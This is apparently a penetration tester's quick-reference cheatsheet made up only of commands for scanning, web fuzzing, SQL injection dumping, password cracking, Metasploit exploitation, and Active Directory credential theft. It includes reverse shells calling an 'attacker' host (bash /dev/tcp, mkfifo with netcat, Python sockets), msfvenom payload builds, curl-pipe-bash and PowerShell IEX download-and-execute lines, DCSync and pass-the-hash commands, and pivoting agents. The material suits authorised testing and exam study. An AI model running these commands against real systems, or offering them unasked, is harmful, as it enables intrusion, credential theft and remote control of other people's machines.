# Tool Quick Reference Cheatsheet

Dense command reference for exam and engagement. No prose — commands only.

## Nmap

```bash
nmap -sC -sV -p- target -oA full                          # full TCP
nmap -sC -sV --top-ports 1000 target -oA quick            # quick
nmap -sU --top-ports 100 target                           # UDP top 100
nmap --script vuln target                                  # vuln scripts
nmap -A target                                             # OS + scripts + traceroute
masscan 192.168.1.0/24 -p- --rate=1000                   # fast full port
```

## Gobuster / ffuf

```bash
gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster vhost -u http://target -w subs.txt --append-domain

ffuf -u http://target/FUZZ -w wordlist.txt -fc 404
ffuf -u "http://target/page?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
ffuf -u http://target -H "Host: FUZZ.target.com" -w subs.txt -fs 1234   # vhost
```

## Burp Suite Shortcuts

```
Ctrl+R          Send to Repeater
Ctrl+I          Send to Intruder
Ctrl+F          Forward (intercept on)
Ctrl+Shift+D    Send to Decoder
```

## SQLmap

```bash
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump
sqlmap -r request.txt --dbs --level=5 --risk=3
```

## Hashcat Modes

```
-m 0      MD5
-m 100    SHA1
-m 1400   SHA-256
-m 1000   NTLM
-m 5600   NetNTLMv2
-m 13100  Kerberos TGS-REP (Kerberoast)
-m 18200  Kerberos AS-REP (AS-REP Roast)
-m 22000  WPA2 PMKID
-m 1800   sha512crypt $6$
-m 3200   bcrypt $2*$

hashcat -m 1000 hashes.txt rockyou.txt
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt --show
```

## Metasploit Sequence

```bash
msfconsole -q
search type:exploit platform:windows smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100 && set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# msfvenom payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o p.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f elf -o p.elf
msfvenom -p php/reverse_php LHOST=attacker LPORT=4444 -f raw -o shell.php
```

## Netcat Shells

```bash
nc -lvnp 4444                                              # listener
bash -i >& /dev/tcp/attacker/4444 0>&1                    # bash reverse shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|bash -i 2>&1|nc attacker 4444 >/tmp/f   # mkfifo
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

## Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm && stty rows 50 cols 220
```

## LinPEAS / WinPEAS Transfer

```bash
# Serve
python3 -m http.server 8000

# Linux download
wget http://attacker:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
curl -s http://attacker:8000/linpeas.sh | bash

# Windows download
certutil -urlcache -split -f http://attacker:8000/winPEASx64.exe C:\Temp\wp.exe
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker:8000/winPEAS.ps1')"
```

## BloodHound Collection

```bash
# From Linux
bloodhound-python -u user -p 'Pass' -d corp.local -c All -ns 192.168.1.10

# From Windows
.\SharpHound.exe -c All --zipfilename out.zip
```

## Impacket Common Commands

```bash
secretsdump.py corp.local/user:Pass@DC01
secretsdump.py corp.local/Admin:Pass@DC01 -just-dc        # DCSync
psexec.py corp.local/Administrator:Pass@192.168.1.10
wmiexec.py corp.local/user:Pass@192.168.1.10
psexec.py -hashes :<NTLM> Administrator@target
GetUserSPNs.py corp.local/user:Pass -dc-ip 192.168.1.10 -request
GetNPUsers.py corp.local/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt
```

## Evil-WinRM

```bash
evil-winrm -i target -u Administrator -p 'Password'
evil-winrm -i target -u Administrator -H '<NTLM_hash>'
# In session:
upload /local/file /remote/path
download C:\path\file /local/path
```

## Ligolo-ng Pivoting

```bash
# Attacker
./proxy -selfcert -laddr 0.0.0.0:11601
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Victim
./agent -connect attacker:11601 -ignore-cert

# Attacker console
ligolo-ng » session
ligolo-ng » 1           # select session
ligolo-ng » start
sudo ip route add 192.168.2.0/24 dev ligolo
```

## Proxychains

```bash
# /etc/proxychains4.conf
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 192.168.2.10
proxychains nxc smb 192.168.2.10 -u user -p pass
proxychains evil-winrm -i 192.168.2.10 -u user -p pass
```

## Nuclei Quick Run

```bash
nuclei -u http://target -severity high,critical
nuclei -list urls.txt -t ~/nuclei-templates/http/cves/ -severity critical
nuclei -update-templates
```
